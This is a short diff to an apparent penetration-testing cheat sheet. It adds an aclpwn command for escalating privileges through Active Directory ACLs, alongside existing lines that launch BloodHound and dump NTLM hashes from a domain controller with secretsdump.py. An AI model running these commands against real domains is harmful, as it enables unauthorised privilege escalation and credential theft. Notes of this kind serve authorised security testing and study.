@@ -114,6 +114,12 @@ Starting up Bloodhound Client
 ```
 ./BloodHound --no-sandbox
 ```
+aclpwn
+
+https://github.com/fox-it/aclpwn.py
+```
+aclpwn -du neo4j -dp 'Myneo4jPassword' -d name.local -f '<username>' -ft user -tt domain -t name.local -s IP
+```
 Dumpling Credentials from the Domain Controller
 ```
 python3 secretsdump.py -just-dc-ntlm <WORKSTATION>/<username>@<IP> 
